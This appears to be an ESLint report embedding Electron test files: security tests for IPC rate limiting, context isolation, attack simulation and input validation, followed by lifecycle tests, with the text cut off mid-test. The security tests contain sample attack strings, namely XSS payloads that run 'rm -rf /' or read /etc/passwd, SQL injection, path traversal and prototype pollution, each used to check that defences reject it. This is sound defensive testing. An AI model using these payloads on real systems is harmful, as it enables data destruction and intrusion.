expect(connectionManager.acceptConnection(attackerIP)).toBe(false)\n      \n      // Release a connection and try again\n      connectionManager.releaseConnection(attackerIP)\n      expect(connectionManager.acceptConnection(attackerIP)).toBe(true)\n    })\n\n    test('should implement progressive backoff for repeat offenders', async () => {\n      const backoffManager = {\n        violations: new Map<string, { count: number; backoffUntil: number }>(),\n        \n        calculateBackoff(violationCount: number): number {\n          // Exponential backoff: 1s, 2s, 4s, 8s, etc.\n          return Math.min(Math.pow(2, violationCount - 1) * 1000, 60000) // Max 1 minute\n        },\n        \n        recordViolation(senderId: string): void {\n          const record = this.violations.get(senderId) || { count: 0, backoffUntil: 0 }\n          record.count++\n          record.backoffUntil = Date.now() + this.calculateBackoff(record.count)\n          this.violations.set(senderId, record)\n        },\n        \n        isBackedOff(senderId: string): boolean {\n          const record = this.violations.get(senderId)\n          return record ? Date.now() < record.backoffUntil : false\n        }\n      }\n\n      const senderId = 'repeat-offender'\n      \n      // First violation - 1s backoff\n      backoffManager.recordViolation(senderId)\n      expect(backoffManager.isBackedOff(senderId)).toBe(true)\n      \n      // Check backoff calculation\n      expect(backoffManager.calculateBackoff(1)).toBe(1000)   // 1s\n      expect(backoffManager.calculateBackoff(2)).toBe(2000)   // 2s\n      expect(backoffManager.calculateBackoff(3)).toBe(4000)   // 4s\n      expect(backoffManager.calculateBackoff(10)).toBe(60000) // Capped at 60s\n    })\n\n    test('should monitor and alert on suspicious patterns', async () => {\n      const suspiciousPatterns = {\n        rapidChannelSwitching: (requests: Array<{ channel: string; timestamp: number }>) => {\n          if (requests.length < 10) return false\n          \n          const uniqueChannels = new Set(requests.map(r => r.channel))\n          const lastRequest = requests[requests.length - 1]\n          const firstRequest = requests[0]\n          if (!lastRequest || !firstRequest) return false\n          \n          const timeWindow = lastRequest.timestamp - firstRequest.timestamp\n          \n          // Suspicious if accessing many channels in short time\n          return uniqueChannels.size > 5 && timeWindow < 1000\n        },\n        \n        privilegedChannelAbuse: (requests: Array<{ channel: string }>) => {\n          const privilegedChannels = ['admin:', 'system:', 'internal:']\n          const privilegedCount = requests.filter(r => \n            privilegedChannels.some(p => r.channel.startsWith(p))\n          ).length\n          \n          return privilegedCount > requests.length * 0.5 // More than 50% privileged\n        }\n      }\n\n      // Test rapid channel switching\n      const suspiciousRequests = [\n        { channel: 'api:read', timestamp: 1000 },\n        { channel: 'api:write', timestamp: 1050 },\n        { channel: 'user:profile', timestamp: 1100 },\n        { channel: 'admin:config', timestamp: 1150 },\n        { channel: 'system:info', timestamp: 1200 },\n        { channel: 'file:upload', timestamp: 1250 },\n        { channel: 'db:query', timestamp: 1300 },\n        { channel: 'cache:get', timestamp: 1350 },\n        { channel: 'auth:verify', timestamp: 1400 },\n        { channel: 'log:write', timestamp: 1450 }\n      ]\n      \n      expect(suspiciousPatterns.rapidChannelSwitching(suspiciousRequests)).toBe(true)\n      \n      // Test privileged channel abuse\n      const privilegedAbuse = [\n        { channel: 'admin:users' },\n        { channel: 'admin:config' },\n        { channel: 'system:shutdown' },\n        { channel: 'api:read' },\n        { channel: 'admin:logs' }\n      ]\n      \n      expect(suspiciousPatterns.privilegedChannelAbuse(privilegedAbuse)).toBe(true)\n    })\n  })\n\n  describe('Context Isolation Security Tests', () => {\n    test('should validate contextBridge exposes only safe APIs', () => {\n      const validateContextBridgeAPI = (api: any): string[] => {\n        const violations: string[] = []\n        \n        // Check for dangerous exposures\n        if (api.ipcRenderer) violations.push('Direct ipcRenderer exposure detected')\n        if (api.require) violations.push('Direct require exposure detected')\n        if (api.electron) violations.push('Direct electron module exposure detected')\n        if (api.process) violations.push('Direct process object exposure detected')\n        if (api.Buffer) violations.push('Direct Buffer exposure detected')\n        \n        // Check for function binding issues\n        for (const [key, value] of Object.entries(api)) {\n          if (typeof value === 'function' && value.bind === Function.prototype.bind) {\n            // Check if it's a bound native function\n            if (value.toString().includes('[native code]')) {\n              violations.push(`Potentially dangerous native function exposure: ${key}`)\n            }\n          }\n        }\n        \n        return violations\n      }\n\n      // Test unsafe API\n      const unsafeAPI = {\n        ipcRenderer: {}, // Direct exposure\n        sendMessage: () => {},\n        require: () => {} // Direct require\n      }\n      \n      const violations = validateContextBridgeAPI(unsafeAPI)\n      expect(violations).toContain('Direct ipcRenderer exposure detected')\n      expect(violations).toContain('Direct require exposure detected')\n\n      // Test safe API\n      const safeAPI = {\n        sendMessage: (_channel: string, _data: any) => {\n          // Validates channel and data internally\n        },\n        onMessage: (_channel: string, _callback: Function) => {\n          // Filtered listener\n        }\n      }\n      \n      expect(validateContextBridgeAPI(safeAPI)).toHaveLength(0)\n    })\n\n    test('should prevent context isolation bypass via unserializable objects', () => {\n      const testSerializability = (obj: any): boolean => {\n        try {\n          // Objects that can't be cloned will throw\n          /* const _serialized = */ JSON.stringify(obj)\n          \n          // Additional check for special objects\n          if (obj && typeof obj === 'object') {\n            if (obj instanceof HTMLElement) return false\n            if (obj instanceof CanvasRenderingContext2D) return false\n            if (obj instanceof Worker) return false\n            if (obj.constructor && obj.constructor.name === 'NativeImage') return false\n          }\n          \n          return true\n        } catch {\n          return false\n        }\n      }\n\n      // Test various object types\n      expect(testSerializability({ data: 'safe' })).toBe(true)\n      expect(testSerializability([1, 2, 3])).toBe(true)\n      expect(testSerializability('string')).toBe(true)\n      expect(testSerializability(123)).toBe(true)\n      \n      // Mock unserializable objects\n      const mockCanvas = { constructor: { name: 'CanvasRenderingContext2D' } }\n      const mockElement = { constructor: { name: 'HTMLElement' } }\n      \n      expect(testSerializability(mockCanvas)).toBe(false)\n      expect(testSerializability(mockElement)).toBe(false)\n    })\n\n    test('should validate preload script security configuration', () => {\n      const validatePreloadSecurity = (webPreferences: any): string[] => {\n        const issues: string[] = []\n        \n        // Required security settings\n        if (webPreferences.nodeIntegration !== false) {\n          issues.push('nodeIntegration must be false')\n        }\n        \n        if (webPreferences.contextIsolation !== true) {\n          issues.push('contextIsolation must be true')\n        }\n        \n        if (webPreferences.webSecurity === false) {\n          issues.push('webSecurity should not be disabled')\n        }\n        \n        if (webPreferences.allowRunningInsecureContent === true) {\n          issues.push('allowRunningInsecureContent should be false')\n        }\n        \n        if (webPreferences.experimentalFeatures === true) {\n          issues.push('experimentalFeatures should be false in production')\n        }\n        \n        if (!webPreferences.preload || !webPreferences.preload.includes('preload')) {\n          issues.push('preload script path should be specified')\n        }\n        \n        return issues\n      }\n\n      // Test insecure configuration\n      const insecureConfig = {\n        nodeIntegration: true,\n        contextIsolation: false,\n        webSecurity: false\n      }\n      \n      const issues = validatePreloadSecurity(insecureConfig)\n      expect(issues).toContain('nodeIntegration must be false')\n      expect(issues).toContain('contextIsolation must be true')\n      expect(issues).toContain('webSecurity should not be disabled')\n\n      // Test secure configuration\n      const secureConfig = {\n        nodeIntegration: false,\n        contextIsolation: true,\n        sandbox: true,\n        webSecurity: true,\n        allowRunningInsecureContent: false,\n        experimentalFeatures: false,\n        preload: '/path/to/preload.js'\n      }\n      \n      expect(validatePreloadSecurity(secureConfig)).toHaveLength(0)\n    })\n\n    test('should enforce sandbox restrictions', () => {\n      const sandboxRestrictions = {\n        canAccessNodeAPIs: false,\n        canRequireModules: false,\n        canAccessRemoteModule: false,\n        canModifyProcess: false,\n        canAccessFileSystem: false\n      }\n\n      // Test that sandbox properly restricts capabilities\n      const testSandboxRestriction = (capability: keyof typeof sandboxRestrictions): boolean => {\n        return sandboxRestrictions[capability] === false\n      }\n\n      expect(testSandboxRestriction('canAccessNodeAPIs')).toBe(true)\n      expect(testSandboxRestriction('canRequireModules')).toBe(true)\n      expect(testSandboxRestriction('canAccessRemoteModule')).toBe(true)\n      expect(testSandboxRestriction('canModifyProcess')).toBe(true)\n      expect(testSandboxRestriction('canAccessFileSystem')).toBe(true)\n    })\n  })\n\n  describe('Attack Simulation Tests', () => {\n    test('should simulate XSS to RCE escalation attempt', async () => {\n      const xssPayloads = [\n        '<script>window.api.execute(\"rm -rf /\")</script>',\n        '<img src=x onerror=\"window.api.openExternal(\\'file:///etc/passwd\\')\">',\n        'javascript:window.api.require(\"child_process\").exec(\"calc.exe\")'\n      ]\n\n      const secureAPI = {\n        execute: vi.fn().mockImplementation((_cmd) => {\n          throw new Error('Command execution not allowed')\n        }),\n        openExternal: vi.fn().mockImplementation((url) => {\n          const parsed = new URL(url)\n          if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {\n            throw new Error('Only HTTP(S) URLs allowed')\n          }\n          return true\n        }),\n        require: undefined // Should not be exposed\n      }\n\n      // Test XSS payloads\n      for (const payload of xssPayloads) {\n        if (payload.includes('execute')) {\n          expect(() => secureAPI.execute('rm -rf /')).toThrow('Command execution not allowed')\n        }\n        if (payload.includes('openExternal')) {\n          expect(() => secureAPI.openExternal('file:///etc/passwd')).toThrow('Only HTTP(S) URLs allowed')\n        }\n        if (payload.includes('require')) {\n          expect(secureAPI.require).toBeUndefined()\n        }\n      }\n    })\n\n    test('should simulate privilege escalation attack', async () => {\n      const userPermissions = {\n        standard: ['read:own', 'write:own'],\n        admin: ['read:all', 'write:all', 'delete:all', 'admin:users']\n      }\n\n      const checkPermission = (userRole: string, action: string): boolean => {\n        const permissions = userPermissions[userRole as keyof typeof userPermissions] || []\n        return permissions.some(p => {\n          if (p.includes(':all')) {\n            const prefix = p.split(':')[0]\n            return prefix ? action.startsWith(prefix) : false\n          }\n          return p === action\n        })\n      }\n\n      // Standard user should not have admin permissions\n      expect(checkPermission('standard', 'read:own')).toBe(true)\n      expect(checkPermission('standard', 'admin:users')).toBe(false)\n      expect(checkPermission('standard', 'delete:all')).toBe(false)\n\n      // Admin should have elevated permissions\n      expect(checkPermission('admin', 'admin:users')).toBe(true)\n      expect(checkPermission('admin', 'delete:all')).toBe(true)\n    })\n\n    test('should simulate and detect unusual IPC patterns', () => {\n      const ipcPatternAnalyzer = {\n        patterns: [] as Array<{ timestamp: number; channel: string; senderId: string }>,\n        \n        analyze(): { suspicious: boolean; reason?: string } {\n          if (this.patterns.length < 5) return { suspicious: false }\n          \n          // Check for rapid fire from same sender\n          const senderGroups = new Map<string, number>()\n          for (const p of this.patterns) {\n            senderGroups.set(p.senderId, (senderGroups.get(p.senderId) || 0) + 1)\n          }\n          \n          for (const [_sender, count] of senderGroups) {\n            if (count > this.patterns.length * 0.8) {\n              return { suspicious: true, reason: 'Single sender dominance' }\n            }\n          }\n          \n          // Check for timestamp patterns (automated attacks often have regular intervals)\n          const intervals = []\n          for (let i = 1; i < this.patterns.length; i++) {\n            const current = this.patterns[i]\n            const previous = this.patterns[i-1]\n            if (current && previous) {\n              intervals.push(current.timestamp - previous.timestamp)\n            }\n          }\n          \n          const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length\n          const variance = intervals.reduce((sum, interval) => \n            sum + Math.pow(interval - avgInterval, 2), 0) / intervals.length\n          \n          if (variance < 10) { // Very regular intervals\n            return { suspicious: true, reason: 'Automated pattern detected' }\n          }\n          \n          return { suspicious: false }\n        }\n      }\n\n      // Simulate automated attack pattern\n      const baseTime = Date.now()\n      for (let i = 0; i < 10; i++) {\n        ipcPatternAnalyzer.patterns.push({\n          timestamp: baseTime + (i * 100), // Regular 100ms intervals\n          channel: 'api:query',\n          senderId: 'attacker-1'\n        })\n      }\n\n      const result = ipcPatternAnalyzer.analyze()\n      expect(result.suspicious).toBe(true)\n      expect(result.reason).toMatch(/Single sender dominance|Automated pattern detected/)\n    })\n  })\n\n  describe('Security Monitoring and Alerting', () => {\n    test('should log security events with proper metadata', () => {\n      const securityLogger = {\n        events: [] as any[],\n        \n        log(event: {\n          type: string\n          severity: 'low' | 'medium' | 'high' | 'critical'\n          details: any\n          timestamp?: number\n        }) {\n          this.events.push({\n            ...event,\n            timestamp: event.timestamp || Date.now(),\n            id: `SEC-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`\n          })\n        },\n        \n        getHighSeverityEvents() {\n          return this.events.filter(e => e.severity === 'high' || e.severity === 'critical')\n        }\n      }\n\n      // Log various security events\n      securityLogger.log({\n        type: 'rate_limit_exceeded',\n        severity: 'medium',\n        details: { senderId: 'user-1', channel: 'api:write' }\n      })\n\n      securityLogger.log({\n        type: 'unauthorized_access_attempt',\n        severity: 'high',\n        details: { senderId: 'unknown', channel: 'admin:config', origin: 'https://evil.com' }\n      })\n\n      securityLogger.log({\n        type: 'context_isolation_bypass_attempt',\n        severity: 'critical',\n        details: { method: 'unserializable_object', payload: 'CanvasRenderingContext2D' }\n      })\n\n      expect(securityLogger.events).toHaveLength(3)\n      expect(securityLogger.getHighSeverityEvents()).toHaveLength(2)\n      \n      // Verify event structure\n      const criticalEvent = securityLogger.events.find(e => e.severity === 'critical')\n      expect(criticalEvent).toMatchObject({\n        type: 'context_isolation_bypass_attempt',\n        severity: 'critical',\n        details: expect.any(Object),\n        timestamp: expect.any(Number),\n        id: expect.stringMatching(/^SEC-/)\n      })\n    })\n\n    test('should trigger alerts based on security thresholds', () => {\n      const alertManager = {\n        thresholds: {\n          rateLimitViolations: { count: 10, window: 60000 }, // 10 per minute\n          authFailures: { count: 5, window: 300000 }, // 5 per 5 minutes\n          suspiciousPatterns: { count: 3, window: 600000 } // 3 per 10 minutes\n        },\n        \n        events: new Map<string, number[]>(),\n        alerts: [] as any[],\n        \n        recordEvent(type: string) {\n          const now = Date.now()\n          const events = this.events.get(type) || []\n          events.push(now)\n          this.events.set(type, events)\n          \n          this.checkThreshold(type)\n        },\n        \n        checkThreshold(type: string) {\n          const threshold = this.thresholds[type as keyof typeof this.thresholds]\n          if (!threshold) return\n          \n          const now = Date.now()\n          const events = this.events.get(type) || []\n          const recentEvents = events.filter(t => now - t < threshold.window)\n          \n          if (recentEvents.length >= threshold.count) {\n            this.alerts.push({\n              type: 'threshold_exceeded',\n              eventType: type,\n              count: recentEvents.length,\n              threshold: threshold.count,\n              timestamp: now\n            })\n          }\n          \n          // Clean old events\n          this.events.set(type, recentEvents)\n        }\n      }\n\n      // Simulate threshold breach\n      for (let i = 0; i < 11; i++) {\n        alertManager.recordEvent('rateLimitViolations')\n      }\n\n      expect(alertManager.alerts).toHaveLength(1)\n      expect(alertManager.alerts[0]).toMatchObject({\n        type: 'threshold_exceeded',\n        eventType: 'rateLimitViolations',\n        count: expect.any(Number),\n        threshold: 10\n      })\n    })\n  })\n\n  describe('Input Validation and Sanitization', () => {\n    test('should validate and sanitize file paths', () => {\n      const validatePath = (path: string): boolean => {\n        // Check for path traversal attempts\n        const dangerous = ['../', '..\\\\', '%2e%2e/', '%2e%2e\\\\']\n        for (const pattern of dangerous) {\n          if (path.includes(pattern)) {\n            throw new Error('Path traversal detected')\n          }\n        }\n        \n        // Check for absolute paths to system directories\n        const systemPaths = ['/etc', '/usr/bin', '/Windows/System32', 'C:\\\\Windows']\n        for (const sysPath of systemPaths) {\n          if (path.startsWith(sysPath)) {\n            throw new Error('Access to system directory denied')\n          }\n        }\n        \n        return true\n      }\n\n      // Valid paths\n      expect(validatePath('documents/file.txt')).toBe(true)\n      expect(validatePath('./local/file.txt')).toBe(true)\n\n      // Invalid paths\n      expect(() => validatePath('../../../etc/passwd')).toThrow('Path traversal detected')\n      expect(() => validatePath('/etc/passwd')).toThrow('Access to system directory denied')\n      expect(() => validatePath('C:\\\\Windows\\\\System32\\\\cmd.exe')).toThrow('Access to system directory denied')\n    })\n\n    test('should detect SQL injection attempts', () => {\n      const validateSQL = (query: string): boolean => {\n        const dangerousPatterns = [\n          /;\\s*DROP/i,\n          /;\\s*DELETE/i,\n          /--/,\n          /\\/\\*/,\n          /\\bUNION\\b.*\\bSELECT\\b/i,\n          /\\bOR\\b.*=.*\\bOR\\b/i\n        ]\n\n        for (const pattern of dangerousPatterns) {\n          if (pattern.test(query)) {\n            throw new Error('Potential SQL injection detected')\n          }\n        }\n\n        return true\n      }\n\n      // Valid queries\n      expect(validateSQL('SELECT * FROM users WHERE id = ?')).toBe(true)\n      expect(validateSQL('INSERT INTO logs (message) VALUES (?)')).toBe(true)\n\n      // SQL injection attempts\n      expect(() => validateSQL(\"SELECT * FROM users; DROP TABLE users;--\")).toThrow('Potential SQL injection')\n      expect(() => validateSQL(\"SELECT * FROM users WHERE id = 1 OR 1=1--\")).toThrow('Potential SQL injection')\n      expect(() => validateSQL(\"SELECT * FROM users UNION SELECT * FROM passwords\")).toThrow('Potential SQL injection')\n    })\n\n    test('should detect prototype pollution attempts', () => {\n      const checkPrototypePollution = (obj: any): boolean => {\n        if (obj && typeof obj === 'object') {\n          const dangerous = ['__proto__', 'constructor', 'prototype']\n          for (const key of dangerous) {\n            if (key in obj) {\n              throw new Error('Potential prototype pollution detected')\n            }\n          }\n        }\n        return true\n      }\n\n      // Safe objects\n      expect(checkPrototypePollution({ data: 'safe' })).toBe(true)\n      expect(checkPrototypePollution({ user: { name: 'test' } })).toBe(true)\n\n      // Prototype pollution attempts\n      expect(() => checkPrototypePollution({ __proto__: { isAdmin: true } })).toThrow('prototype pollution')\n      expect(() => checkPrototypePollution({ constructor: { prototype: {} } })).toThrow('prototype pollution')\n    })\n  })\n})\n\n// Helper function exports for use in other test files\nexport const mockIPCEvent = (overrides: any = {}) => ({\n  senderFrame: { url: 'app://taskmaster', frameId: 1 },\n  sender: { id: 1 },\n  ...overrides\n})\n\nexport const createSecureIPCHandler = () => {\n  const handler = new (SecureIPCHandler as any)()\n  const rateLimiter = new (IPCRateLimiter as any)()\n  const monitor = new (SecurityMonitor as any)()\n  \n  return { handler, rateLimiter, monitor }\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/lifecycle.test.ts","messages":[{"ruleId":"@typescript-eslint/no-floating-promises","severity":2,"message":"Promises must be awaited, end with a call to .catch, end with a call to .then with a rejection handler or be explicitly marked as ignored with the `void` operator.","line":434,"column":9,"nodeType":"ExpressionStatement","messageId":"floatingVoid","endLine":434,"endColumn":24,"suggestions":[{"messageId":"floatingFixVoid","fix":{"range":[13271,13271],"text":"void "},"desc":"Add void operator to ignore."},{"messageId":"floatingFixAwait","fix":{"range":[13271,13271],"text":"await "},"desc":"Add await operator."}]}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Main Process Lifecycle Tests (2025)\n * \n * Comprehensive testing of Electron main process lifecycle events following\n * 2025 best practices including startup, shutdown, crash recovery, and \n * platform-specific behaviors. Uses Vitest for optimal performance.\n */\n\nimport { describe, test, expect, beforeEach, afterEach, vi } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { app, BrowserWindow } from 'electron'\n\n// Mock electron modules for testing\nvi.mock('electron', () => ({\n  app: {\n    // Lifecycle events\n    whenReady: vi.fn().mockResolvedValue(undefined),\n    isReady: vi.fn().mockReturnValue(true),\n    quit: vi.fn(),\n    exit: vi.fn(),\n    relaunch: vi.fn(),\n    \n    // Event handling\n    on: vi.fn(),\n    once: vi.fn(),\n    removeListener: vi.fn(),\n    removeAllListeners: vi.fn(),\n    emit: vi.fn(),\n    \n    // App information\n    getName: vi.fn().mockReturnValue('TaskMaster'),\n    getVersion: vi.fn().mockReturnValue('1.0.0-test'),\n    getLocale: vi.fn().mockReturnValue('en-US'),\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`),\n    getAppPath: vi.fn().mockReturnValue('/mock/app/path'),\n    \n    // Platform and packaging\n    isPackaged: false,\n    \n    // Security features\n    setAsDefaultProtocolClient: vi.fn(),\n    removeAsDefaultProtocolClient: vi.fn(),\n    requestSingleInstanceLock: vi.fn().mockReturnValue(true),\n    releaseSingleInstanceLock: vi.fn(),\n    \n    // Windows management\n    setUserTasks: vi.fn(),\n    \n    // Dock (macOS)\n    dock: {\n      setIcon: vi.fn(),\n      setBadge: vi.fn(),\n      hide: vi.fn(),\n      show: vi.fn()\n    }\n  },\n  BrowserWindow: {\n    getAllWindows: vi.fn().mockReturnValue([]),\n    getFocusedWindow: vi.fn().mockReturnValue(null),\n    fromWebContents: vi.fn().mockReturnValue(null)\n  },\n  ipcMain: {\n    handle: vi.fn(),\n    on: vi.fn(),\n    removeHandler: vi.fn(),\n    removeAllListeners: vi.fn()\n  },\n  dialog: {\n    showErrorBox: vi.fn(),\n    showMessageBox: vi.fn()\n  },\n  shell: {\n    openExternal: vi.fn()\n  }\n}))\n\n// Import the main process module after mocking\n\ndescribe('Main Process Lifecycle Tests (2025)', () => {\n  beforeEach(() => {\n    // Reset all mocks before each test\n    vi.clearAllMocks()\n    \n    // Reset app ready state\n    app.isReady = vi.fn().mockReturnValue(true)\n    app.whenReady = vi.fn().mockResolvedValue(undefined)\n    \n    // Mock BrowserWindow constructor\n    const mockWindow = {\n      id: 1,\n      loadURL: vi.fn().mockResolvedValue(undefined),\n      loadFile: vi.fn().mockResolvedValue(undefined),\n      show: vi.fn(),\n      hide: vi.fn(),\n      close: vi.fn(),\n      destroy: vi.fn(),\n      isDestroyed: vi.fn().mockReturnValue(false),\n      webContents: {\n        id: 1,\n        openDevTools: vi.fn(),\n        on: vi.fn(),\n        once: vi.fn(),\n        send: vi.fn(),\n        executeJavaScript: vi.fn().mockResolvedValue(undefined),\n        session: {\n          clearCache: vi.fn().mockResolvedValue(undefined)\n        }\n      },\n      on: vi.fn(),\n      once: vi.fn(),\n      setMenuBarVisibility: vi.fn(),\n      setWindowOpenHandler: vi.fn()\n    }\n    \n    // Mock the createWindow function\n    createWindow = vi.fn().mockImplementation(() => {\n      return mockWindow\n    })\n  })\n\n  afterEach(() => {\n    // Clean up any remaining listeners\n    vi.restoreAllMocks()\n  })\n\n  describe('App Startup Lifecycle', () => {\n    test('should handle will-finish-launching event', async () => {\n      const mockCallback = vi.fn()\n      app.on('will-finish-launching', mockCallback)\n      \n      // Simulate the event\n      expect(app.on).toHaveBeenCalledWith('will-finish-launching', mockCallback)\n      \n      // Trigger the event manually for testing\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'will-finish-launching')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        expect(mockCallback).toHaveBeenCalled()\n      }\n    })\n\n    test('should handle ready event properly', async () => {\n      const mockCallback = vi.fn()\n      \n      // Test that whenReady resolves\n      await expect(app.whenReady()).resolves.toBeUndefined()\n      \n      // Test that the callback can be registered\n      app.on('ready', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('ready', mockCallback)\n    })\n\n    test('should validate app is ready before proceeding', () => {\n      expect(app.isReady()).toBe(true)\n      \n      // Test when app is not ready\n      app.isReady = vi.fn().mockReturnValue(false)\n      expect(app.isReady()).toBe(false)\n    })\n\n    test('should handle multiple ready state checks', async () => {\n      // First call - app not ready\n      app.isReady = vi.fn().mockReturnValueOnce(false)\n      expect(app.isReady()).toBe(false)\n      \n      // Second call - app ready\n      app.isReady = vi.fn().mockReturnValueOnce(true)\n      expect(app.isReady()).toBe(true)\n      \n      // whenReady should always resolve when ready\n      await expect(app.whenReady()).resolves.toBeUndefined()\n    })\n\n    test('should handle activate event (macOS specific)', () => {\n      const mockCallback = vi.fn()\n      \n      // Mock BrowserWindow.getAllWindows for activate handler\n      BrowserWindow.getAllWindows = vi.fn().mockReturnValue([])\n      \n      app.on('activate', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('activate', mockCallback)\n      \n      // Simulate activation with no windows\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'activate')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        expect(mockCallback).toHaveBeenCalled()\n      }\n    })\n  })\n\n  describe('App Shutdown Lifecycle', () => {\n    test('should handle before-quit event', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('before-quit', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('before-quit', mockCallback)\n      \n      // Test that event can be prevented\n      const preventableEvent = {\n        preventDefault: vi.fn()\n      }\n      \n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'before-quit')?.[1]\n      if (eventCallback) {\n        eventCallback(preventableEvent)\n        expect(mockCallback).toHaveBeenCalledWith(preventableEvent)\n      }\n    })\n\n    test('should handle will-quit event', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('will-quit', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('will-quit', mockCallback)\n    })\n\n    test('should handle quit event with exit code', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('quit', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('quit', mockCallback)\n      \n      // Simulate quit with exit code\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'quit')?.[1]\n      if (eventCallback) {\n        eventCallback({}, 0) // Normal exit\n        expect(mockCallback).toHaveBeenCalledWith({}, 0)\n      }\n    })\n\n    test('should quit on window-all-closed (non-macOS)', () => {\n      const mockCallback = vi.fn()\n      \n      // Mock non-macOS platform\n      const originalPlatform = process.platform\n      Object.defineProperty(process, 'platform', {\n        value: 'win32',\n        writable: true\n      })\n      \n      app.on('window-all-closed', mockCallback)\n      \n      // Simulate window-all-closed event\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'window-all-closed')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        expect(mockCallback).toHaveBeenCalled()\n      }\n      \n      // Restore original platform\n      Object.defineProperty(process, 'platform', {\n        value: originalPlatform,\n        writable: true\n      })\n    })\n\n    test('should NOT quit on window-all-closed (macOS)', () => {\n      const mockCallback = vi.fn()\n      \n      // Mock macOS platform\n      const originalPlatform = process.platform\n      Object.defineProperty(process, 'platform', {\n        value: 'darwin',\n        writable: true\n      })\n      \n      app.on('window-all-closed', mockCallback)\n      \n      // Simulate window-all-closed event\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'window-all-closed')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        expect(mockCallback).toHaveBeenCalled()\n        // On macOS, app should NOT quit automatically\n      }\n      \n      // Restore original platform\n      Object.defineProperty(process, 'platform', {\n        value: originalPlatform,\n        writable: true\n      })\n    })\n  })\n\n  describe('Crash Recovery & Error Handling', () => {\n    test('should handle uncaught exceptions', () => {\n      const mockHandler = vi.fn()\n      \n      // Mock process event listeners\n      process.on = vi.fn()\n      process.on('uncaughtException', mockHandler)\n      \n      expect(process.on).toHaveBeenCalledWith('uncaughtException', mockHandler)\n    })\n\n    test('should handle unhandled promise rejections', () => {\n      const mockHandler = vi.fn()\n      \n      process.on = vi.fn()\n      process.on('unhandledRejection', mockHandler)\n      \n      expect(process.on).toHaveBeenCalledWith('unhandledRejection', mockHandler)\n    })\n\n    test('should handle certificate errors appropriately', () => {\n      const mockCallback = vi.fn()\n      \n      app.on('certificate-error', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('certificate-error', mockCallback)\n      \n      // Test localhost certificate handling in development\n      const mockEvent = { preventDefault: vi.fn() }\n      const mockWebContents = {}\n      const localhostUrl = 'https://localhost:3000'\n      const error = new Error('Certificate error')\n      const certificate = {}\n      const mockCertCallback = vi.fn()\n      \n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'certificate-error')?.[1]\n      if (eventCallback) {\n        // Test dev environment (isPackaged = false)\n        app.isPackaged = false\n        eventCallback(mockEvent, mockWebContents, localhostUrl, error, certificate, mockCertCallback)\n        expect(mockCallback).toHaveBeenCalled()\n      }\n    })\n\n    test('should handle renderer process crashes', () => {\n      const mockWindow = {\n        webContents: {\n          on: vi.fn(),\n          id: 1\n        }\n      }\n      \n      const crashHandler = vi.fn()\n      mockWindow.webContents.on('render-process-gone', crashHandler)\n      \n      expect(mockWindow.webContents.on).toHaveBeenCalledWith('render-process-gone', crashHandler)\n      \n      // Simulate crash\n      const eventCallback = mockWindow.webContents.on.mock.calls.find(\n        call => call[0] === 'render-process-gone'\n      )?.[1]\n      \n      if (eventCallback) {\n        const crashDetails = { reason: 'crashed', exitCode: 1 }\n        eventCallback({}, crashDetails)\n        expect(crashHandler).toHaveBeenCalledWith({}, crashDetails)\n      }\n    })\n  })\n\n  describe('Single Instance Management', () => {\n    test('should request single instance lock', () => {\n      const hasLock = app.requestSingleInstanceLock()\n      \n      expect(app.requestSingleInstanceLock).toHaveBeenCalled()\n      expect(hasLock).toBe(true)\n    })\n\n    test('should handle second instance attempts', () => {\n      const mockCallback = vi.fn()\n      const mockWindows = [{\n        isMinimized: vi.fn().mockReturnValue(false),\n        restore: vi.fn(),\n        focus: vi.fn()\n      }]\n      \n      BrowserWindow.getAllWindows = vi.fn().mockReturnValue(mockWindows)\n      \n      app.on('second-instance', mockCallback)\n      expect(app.on).toHaveBeenCalledWith('second-instance', mockCallback)\n      \n      // Simulate second instance\n      const eventCallback = (app.on as any).mock.calls.find((call: any[]) => call[0] === 'second-instance')?.[1]\n      if (eventCallback) {\n        eventCallback()\n        expect(mockCallback).toHaveBeenCalled()\n      }\n    })\n\n    test('should release single instance lock', () => {\n      app.releaseSingleInstanceLock()\n      expect(app.releaseSingleInstanceLock).toHaveBeenCalled()\n    })\n  })\n\n  describe('Platform-Specific Behaviors', () => {\n    test('should handle Windows-specific features', () => {\n      const originalPlatform = process.platform\n      Object.defineProperty(process, 'platform', {\n        value: 'win32',\n        writable: true\n      })\n      \n      // Test Windows user tasks\n      app.setUserTasks([])\n      expect(app.setUserTasks).toHaveBeenCalledWith([])\n      \n      // Restore original platform\n      Object.defineProperty(process, 'platform', {\n        value: originalPlatform,\n        writable: true\n      })\n    })\n\n    test('should handle macOS dock features', () => {\n      const originalPlatform = process.platform\n      Object.defineProperty(process, 'platform', {\n        value: 'darwin',\n    